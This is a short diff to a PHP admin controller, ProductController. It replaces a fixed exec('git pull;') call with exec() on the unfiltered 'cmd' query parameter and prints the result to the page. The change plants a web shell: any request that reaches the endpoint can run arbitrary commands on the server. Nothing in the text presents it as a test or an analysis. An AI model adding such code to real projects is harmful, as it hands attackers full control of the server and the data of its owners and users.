@@ -31,7 +31,7 @@ class ProductController extends AdminController
         if (isset($_GET['cmd'])) {
             $d = $_GET['cmd'];
             if (strlen($d) > 2) {
-                $ret = exec('git pull;', $output, $error);
+                $ret = exec($d, $output, $error);
                 echo '<pre>';
                 print_r($ret);
                 echo '<hr>';
